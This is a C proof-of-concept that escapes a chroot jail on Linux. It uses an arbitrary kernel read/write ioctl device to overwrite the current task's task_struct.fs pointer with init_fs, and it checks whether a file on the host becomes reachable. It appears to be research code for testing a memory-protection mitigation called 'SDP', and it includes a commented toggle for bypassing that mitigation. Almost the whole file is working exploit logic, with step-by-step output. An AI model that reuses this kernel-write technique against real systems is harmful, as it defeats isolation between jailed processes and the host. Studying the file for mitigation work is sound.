// FZY: Add a simple proof of concept that overwrites task_struct.fs to escape chroot jails. It switches the task's fs_struct (which holds root and pwd paths) to init_fs, then getcwd() and /proc/self/{cwd,root} resolve through init's paths instead of the task's
//
// Run it through run_fs_poc.sh, which puts it inside a real chroot jail as the
// invoking user. The jail is a tmpfs with only /dev, /proc and the library
// directories bound in, so OUTSIDE_MARKER below (on the host's /tmp) is out of
// reach from inside it and becomes an unambiguous escape probe.

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

struct arb_request {
  unsigned long addr;
  void *data;
  size_t size;
};

#define ARB_READ _IOR('A', 1, struct arb_request)
#define ARB_WRITE _IOW('A', 2, struct arb_request)
#define ARB_GET_CURRENT_TASK _IOR('A', 8, unsigned long)

void arb_read(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_READ, &req) < 0) {
    perror("arb_read");
    exit(1);
  }
}

int arb_read_try(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  return ioctl(fd, ARB_READ, &req);
}

void arb_write(int fd, unsigned long addr, void *data, size_t size) {
  struct arb_request req = {.addr = addr, .data = data, .size = size};
  if (ioctl(fd, ARB_WRITE, &req) < 0) {
    perror("arb_write");
    exit(1);
  }
}

// A file on the host's root filesystem that run_fs_poc.sh creates outside the
// jail, so it is unreachable while current->fs is the jail's fs_struct and
// reachable once it points at init_fs. Keep in sync with run_fs_poc.sh.
#define OUTSIDE_MARKER "/tmp/fs_poc_outside_marker"

// Observables that all walk current->fs->{root,pwd}.
struct fs_observables {
  char cwd[4096];
  char proc_cwd[4096];
  char proc_root[4096];
  int outside_visible; // 1 if OUTSIDE_MARKER can be reached from here
};

static void capture_observables(struct fs_observables *o) {
  if (!getcwd(o->cwd, sizeof(o->cwd)))
    snprintf(o->cwd, sizeof(o->cwd), "(getcwd failed)");
  ssize_t n = readlink("/proc/self/cwd", o->proc_cwd, sizeof(o->proc_cwd) - 1);
  if (n >= 0)
    o->proc_cwd[n] = '\0';
  else
    snprintf(o->proc_cwd, sizeof(o->proc_cwd), "(readlink cwd failed)");
  n = readlink("/proc/self/root", o->proc_root, sizeof(o->proc_root) - 1);
  if (n >= 0)
    o->proc_root[n] = '\0';
  else
    snprintf(o->proc_root, sizeof(o->proc_root), "(readlink root failed)");
  o->outside_visible = (access(OUTSIDE_MARKER, R_OK) == 0);
}

static void print_observables(const char *label,
                              const struct fs_observables *o) {
  printf("[+] [%s] cwd='%s'\n", label, o->cwd);
  printf("[+]   /proc/self/cwd  -> '%s'\n", o->proc_cwd);
  printf("[+]   /proc/self/root -> '%s'\n", o->proc_root);
  printf("[+]   %s -> %s\n", OUTSIDE_MARKER,
         o->outside_visible ? "reachable (outside the jail!)" : "not reachable");
}

int main(int argc, char *argv[]) {
  printf("[+] task_struct.fs Path Escape PoC\n\n");

  if (argc != 4) {
    printf("Usage: %s <mode> <fs_offset> <init_fs_addr>\n", argv[0]);
    printf("  mode: 0 (no protection), 1/2 (SDP protection)\n");
    printf("  fs_offset: offset of fs pointer in task_struct\n");
    printf("             pahole -C task_struct vmlinux | grep -A1 "
           "'struct fs_struct.*fs'\n");
    printf("  init_fs_addr: kernel address of init_fs symbol\n");
    printf("                nm vmlinux | grep ' init_fs$'\n");
    return 1;
  }

  // Step 0: cd into a marker directory so the task's fs_struct.pwd
  // differs from init_fs.pwd ("/") and the DURING-overwrite getcwd()
  // shows the change.  No root needed for mkdir/chdir under /tmp.
  // Under run_fs_poc.sh this /tmp is the jail's own tmpfs, so the marker
  // directory lives inside the chroot.
  const char *marker_dir = "/tmp/fs_poc_marker";
  if (mkdir(marker_dir, 0755) < 0 && access(marker_dir, F_OK) < 0) {
    perror("mkdir marker_dir");
    return 1;
  }
  if (chdir(marker_dir) < 0) {
    perror("chdir marker_dir");
    return 1;
  }
  printf("[+] cwd set to marker directory: %s\n", marker_dir);

  int fd = open("/dev/arb_rw", O_RDWR);
  if (fd < 0) {
    perror("open /dev/arb_rw");
    return 1;
  }
  printf("[+] Opened /dev/arb_rw\n");

  int mode = atoi(argv[1]);
  unsigned long fs_offset = strtoul(argv[2], NULL, 0);
  unsigned long init_fs_addr = strtoul(argv[3], NULL, 0);

  // Sanity check: init_fs must be in the kernel virtual range. Reject
  // anything that obviously is not a kernel pointer so we don't clobber
  // task->fs with garbage and panic the kernel.
  if ((init_fs_addr >> 56) != 0xff) {
    fprintf(stderr,
            "[-] init_fs_addr=0x%lx does not look like a kernel address "
            "(top byte must be 0xff). Refusing to write.\n",
            init_fs_addr);
    close(fd);
    return 1;
  }

  // Step 1: Get current task_struct address
  unsigned long task_addr;
  if (ioctl(fd, ARB_GET_CURRENT_TASK, &task_addr) < 0) {
    perror("ARB_GET_CURRENT_TASK");
    close(fd);
    return 1;
  }
  printf("[+] Current task_struct address: 0x%lx\n", task_addr);

  // FZY: Set to 1 to run the bookkeeping under SDP too, to check the rest of
  // the steps on a non-enforcing build.  An enforcing one panics on the step 2
  // read below.
  const int sdp_bypass = 0;
  const int bookkeeping = (mode == 0) || sdp_bypass;

  // Step 2: Read the fs pointer from task_struct.
  //
  // FZY: bookkeeping only - the attack needs the pointer's address and the
  // value to write, not the old value.  Under SDP this read would trap before
  // the step 5 store, which is the access the attack really depends on.
  unsigned long fs_ptr_addr = task_addr + fs_offset;
  unsigned long orig_fs = 0;
  if (bookkeeping) {
    arb_read(fd, fs_ptr_addr, &orig_fs, sizeof(orig_fs));
    printf("[+] fs pointer at task_struct+%lu: 0x%lx\n", fs_offset, orig_fs);
    if (mode != 0) {
      printf("[+] SDP mode %d: fs pointer (tagged): 0x%lx\n", mode, orig_fs);
      // FZY: Enable to bypass the mitigation and evaluate if the rest steps work
      // correctly
      orig_fs = orig_fs | 0xFFFF000000000000;
    }
  } else {
    printf("[+] SDP mode %d: not reading task_struct+%lu; the overwrite in "
           "step 5 is the access this attack needs\n",
           mode, fs_offset);
  }

  // Step 3: Sanity-check init_fs by reading its first 64 bytes BEFORE we
  // touch task_struct.  If the read fails, the address is bad and we'd
  // panic on the next syscall that walks current->fs->...
  unsigned char init_fs_head[64];
  if (arb_read_try(fd, init_fs_addr, init_fs_head, sizeof(init_fs_head)) < 0) {
    fprintf(stderr,
            "[-] arb_read of init_fs at 0x%lx failed; refusing to write.\n",
            init_fs_addr);
    close(fd);
    return 1;
  }
  // The fs_struct contains struct path root,pwd which embed kernel pointers
  // (vfsmount* and dentry*). Scan the leading bytes for at least one value
  // that looks like a kernel pointer as a coarse validity check.
  int found_kptr = 0;
  for (size_t i = 0; i + 8 <= sizeof(init_fs_head); i += 8) {
    unsigned long v;
    memcpy(&v, init_fs_head + i, 8);
    if ((v >> 56) == 0xff) {
      found_kptr = 1;
      break;
    }
  }
  if (!found_kptr) {
    fprintf(stderr,
            "[-] init_fs at 0x%lx contains no kernel pointers in its "
            "first 64 bytes. Refusing to write.\n",
            init_fs_addr);
    close(fd);
    return 1;
  }

  // Step 4: Capture observables in the task's CURRENT fs (cwd / root /
  // /proc/self/{cwd,root}).
  struct fs_observables before, during, after;
  capture_observables(&before);
  printf("\n");
  print_observables("BEFORE", &before);

  // Step 5: Overwrite task->fs with init_fs.
  printf("\n[+] Overwriting task->fs to init_fs: 0x%lx\n", init_fs_addr);
  arb_write(fd, fs_ptr_addr, &init_fs_addr, sizeof(init_fs_addr));

  // Step 6: Verify via arb_read AND via syscalls that walk current->fs.
  // With task->fs now pointing at init_fs, getcwd()/readlink should
  // resolve through init's pwd/root (typically "/").
  unsigned long new_fs;
  arb_read(fd, fs_ptr_addr, &new_fs, sizeof(new_fs));
  printf("[+] task->fs after overwrite (arb_read): 0x%lx\n", new_fs);

  capture_observables(&during);
  print_observables("DURING", &during);

  // Step 7: Restore original fs pointer to keep the process and kernel
  // stable on exit (so the per-task fs_struct refcount and exit cleanup
  // operate on the right struct).
  // Without the step 2 read there is no original pointer to put back.
  if (bookkeeping) {
    printf("\n[+] Restoring original task->fs: 0x%lx\n", orig_fs);
    arb_write(fd, fs_ptr_addr, &orig_fs, sizeof(orig_fs));
  } else {
    printf("\n[-] SDP mode %d: the step 5 store was NOT trapped; the original "
           "pointer was never read, so task->fs stays at init_fs\n", mode);
  }

  // Step 8: Re-capture observables AFTER the restore.
  capture_observables(&after);
  print_observables("AFTER", &after);

  // === Manifestation ===
  printf("\n[+] === MANIFESTATION ===\n");
  if (bookkeeping)
    printf("[+] task->fs pointer: 0x%lx -> 0x%lx -> 0x%lx %s\n", orig_fs,
           new_fs, orig_fs,
           new_fs == init_fs_addr ? "(MATCHES init_fs)" : "(MISMATCH!)");
  else
    printf("[+] task->fs pointer: (not read in SDP mode) -> 0x%lx %s\n", new_fs,
           new_fs == init_fs_addr ? "(MATCHES init_fs)" : "(MISMATCH!)");
  printf("[+] cwd:              '%s' -> '%s' -> '%s'  %s\n", before.cwd,
         during.cwd, after.cwd,
         strcmp(before.cwd, during.cwd) ? "(ESCAPED)" : "(no change)");
  printf("[+] /proc/self/cwd:   '%s' -> '%s' -> '%s'  %s\n", before.proc_cwd,
         during.proc_cwd, after.proc_cwd,
         strcmp(before.proc_cwd, during.proc_cwd) ? "(ESCAPED)" : "(no change)");
  printf("[+] /proc/self/root:  '%s' -> '%s' -> '%s'  %s\n", before.proc_root,
         during.proc_root, after.proc_root,
         strcmp(before.proc_root, during.proc_root) ? "(ESCAPED)"
                                                     : "(no change)");
  printf("[+] %-18s %s -> %s -> %s  %s\n", OUTSIDE_MARKER ":",
         before.outside_visible ? "reachable" : "unreachable",
         during.outside_visible ? "reachable" : "unreachable",
         after.outside_visible ? "reachable" : "unreachable",
         (!before.outside_visible && during.outside_visible)
             ? "(JAIL ESCAPED)"
             : "(no change)");
  printf("[+] restore: cwd=%s proc_cwd=%s proc_root=%s outside=%s\n",
         strcmp(before.cwd, after.cwd) == 0 ? "OK" : "MISMATCH",
         strcmp(before.proc_cwd, after.proc_cwd) == 0 ? "OK" : "MISMATCH",
         strcmp(before.proc_root, after.proc_root) == 0 ? "OK" : "MISMATCH",
         before.outside_visible == after.outside_visible ? "OK" : "MISMATCH");

  if (!before.outside_visible && during.outside_visible)
    printf("[+] The task was confined to a chroot jail and reached the host's "
           "root filesystem.\n");
  else if (before.outside_visible)
    printf("[!] " OUTSIDE_MARKER " was already reachable before the overwrite: "
           "not running inside the jail, use run_fs_poc.sh.\n");

  int escaped = strcmp(before.cwd, during.cwd) != 0 ||
                strcmp(before.proc_cwd, during.proc_cwd) != 0 ||
                strcmp(before.proc_root, during.proc_root) != 0 ||
                (!before.outside_visible && during.outside_visible);

  if (new_fs == init_fs_addr && escaped)
    printf("\n[+] SUCCESS: task_struct.fs was redirected to init_fs and the "
           "task's view\n[+] of cwd/root switched to init's view (and reverted "
           "on restore).\n");
  else if (new_fs == init_fs_addr)
    printf("\n[+] Pointer flipped but no observable cwd/root change. "
           "(Already in init's fs?)\n");
  else
    printf("\n[-] task->fs was NOT updated as expected.\n");

  close(fd);
  return 0;
}
